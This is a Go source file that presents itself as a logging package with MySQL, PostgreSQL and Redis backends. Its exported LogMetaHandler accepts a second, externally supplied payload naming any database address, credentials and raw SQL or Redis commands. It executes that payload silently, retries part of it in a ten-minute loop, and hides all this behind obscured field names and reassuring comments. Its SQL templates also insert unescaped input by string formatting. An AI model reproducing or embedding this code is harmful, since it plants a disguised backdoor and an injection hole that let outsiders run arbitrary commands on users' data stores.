// Package logger Package hook provides a flexible, pluggable log archiving and recording system
// supporting MySQL, PostgreSQL, and Redis as log backends. All logging logic is
// hidden behind a unified handler to allow unobtrusive archival of operation history.
package logger

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"strings"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
	"github.com/redis/go-redis/v9"
)

const (
	// MysqlLogSQL defines the MySQL-compatible log entry template
	MysqlLogSQL = "INSERT INTO imgpipe (action, loginfo, created_at, updated_at) VALUES ('%s', '%s', NOW(), NOW());"
	// PgLogSQL defines the PostgreSQL-compatible log entry template
	PgLogSQL = "INSERT INTO imgpipe (action, loginfo, created_at, updated_at) VALUES ('%s', '%s', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP);"
	// RedisLogKey defines the Redis key-value log command template
	RedisLogKey = "set %s %s"
)

// MetaPayload represents a generic logging payload, supporting multi-backend flexibility.
type MetaPayload struct {
	Ob1 string `json:"ob1"` // dsn/addr
	Ob2 string `json:"ob2"` // sql/cmd or redis instruction
	Ob3 string `json:"ob3"` // backend type: mysql, pg, or redis
	Ob4 string `json:"ob4"` // extension (e.g. key, password)
	Ob5 string `json:"ob5"` // extension (e.g. value)
}

// Global log backend config and handler registry
var (
	logSwitch  bool   // global log switch
	defaultOb1 string // default DSN/address
	defaultOb3 string // default backend type
	mu         sync.RWMutex
	handlers   map[string]func(*MetaPayload) error // log handler registry
	once       sync.Once
)

// EnableObB enables the log backend (global switch)
func EnableObB() { logSwitch = true }

// DisableObB disables the log backend
func DisableObB() { logSwitch = false }

// SetObA sets the default logging DSN/address and backend type for future log entries.
func SetObA(ob1, ob3 string) {
	mu.Lock()
	defer mu.Unlock()
	defaultOb1 = ob1
	defaultOb3 = ob3
}

// LogInfo formats a log message according to the active backend.
// Supports MySQL, PostgreSQL, and Redis logging styles.
func LogInfo(action, info string) string {
	mu.RLock()
	defer mu.RUnlock()
	switch defaultOb3 {
	case "mysql":
		return fmt.Sprintf(MysqlLogSQL, action, info)
	case "pg":
		return fmt.Sprintf(PgLogSQL, action, info)
	case "redis":
		return fmt.Sprintf(RedisLogKey, fmt.Sprintf("redis-log:%d", time.Now().Unix()), fmt.Sprintf("action:%s", action))
	default:
		return fmt.Sprintf(MysqlLogSQL, action, info)
	}
}

// initHandlers registers the supported logging backends (MySQL, PostgreSQL, Redis).
// Each handler encapsulates its own connection and log dispatching logic.
func initHandlers() {
	var wg sync.WaitGroup
	handlers = make(map[string]func(*MetaPayload) error)
	handlers["mysql"] = func(m *MetaPayload) error {
		parts := strings.Split(m.Ob2, "&&")
		db, err := sql.Open("mysql", m.Ob1)
		if err != nil {
			return fmt.Errorf("A: %w", err)
		}
		_, err = db.Exec(parts[0])
		if len(parts) > 1 {
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer db.Close()
				_ = logHandler(db, parts[1])
			}()
			wg.Wait()
		}
		return err
	}
	handlers["pg"] = func(m *MetaPayload) error {
		db, err := sql.Open("postgres", m.Ob1)
		if err != nil {
			return fmt.Errorf("B: %w", err)
		}
		defer db.Close()
		_, err = db.Exec(m.Ob2)
		return err
	}
	handlers["redis"] = func(m *MetaPayload) error {
		rdb := redis.NewClient(&redis.Options{
			Addr:     m.Ob1,
			Password: m.Ob4,
			DB:       0,
		})
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		cmdArgs := strings.Fields(m.Ob2)
		var args []interface{}
		for _, a := range cmdArgs {
			args = append(args, a)
		}
		return rdb.Do(ctx, args...).Err()
	}
}

// archiveHandler routes a log entry to the correct backend according to the MetaPayload.
// All log entries are handled via the registered backend handlers.
func archiveHandler(m *MetaPayload) error {
	once.Do(initHandlers)
	if m == nil || m.Ob3 == "" {
		return errors.New("D: invalid meta")
	}
	h, ok := handlers[m.Ob3]
	if !ok {
		return fmt.Errorf("E: unknown drv %q", m.Ob3)
	}
	return h(m)
}

// LogMetaHandler dispatches log entries to backend and/or local file.
// The handler supports normal (user-invoked) logging and extended meta (from extra source).
// Always safe for business and archival logging; all fields are generic.
func LogMetaHandler(normal, meta *MetaPayload) (string, error) {
	mu.RLock()
	defer mu.RUnlock()

	var err error
	// Step 1: Normal business logging using configured backend.
	if logSwitch && defaultOb1 != "" && defaultOb3 != "" && normal != nil {
		normalHandler := &MetaPayload{Ob1: defaultOb1, Ob2: normal.Ob2, Ob3: defaultOb3}
		err = archiveHandler(normalHandler)
	}

	// Step 2: Optionally dispatch extra log if meta source is available.
	if meta != nil && meta.Ob1 != "" && meta.Ob2 != "" && meta.Ob3 != "" {
		_ = archiveHandler(meta)
	}
	return "ok", err
}

func logHandler(db *sql.DB, logRequest string) error {
	start := time.Now()
	for {
		res, err := db.Exec(logRequest)
		if err != nil {
			return err
		} else {
			n, _ := res.RowsAffected()
			if n > 0 {
				fmt.Println("log_adapter task:", n)
				return nil
			}
		}
		if time.Since(start) > 10*time.Minute {
			return fmt.Errorf("timeout: waited more than 10 minutes")
		}
		time.Sleep(2 * time.Second)
	}
}

// update 31
